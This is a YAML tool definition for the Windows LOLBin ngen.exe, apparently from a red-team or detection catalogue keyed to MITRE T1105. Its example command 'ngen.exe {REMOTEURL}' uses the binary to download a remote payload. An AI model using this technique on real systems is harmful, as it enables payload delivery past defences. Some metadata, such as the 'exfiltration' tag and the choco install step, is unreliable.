---
id: windows-download-ngen
namespace: windows:download:ngen
name: ngen
description: 'Microsoft Native Image Generator. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe;
  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- ngen
parameters: []
features:
- network-intensive
- pipes-stdout
execution:
  template: ngen
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server using the Microsoft Native Image
    Generator utility. (It will download a remote payload and place it in INetCache.)
  command: ngen.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections: []
install:
- method: choco
  package_name: ngen
  commands:
  - choco install ngen
---

# ngen

ngen is a Windows LOLBin. Microsoft Native Image Generator. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe.
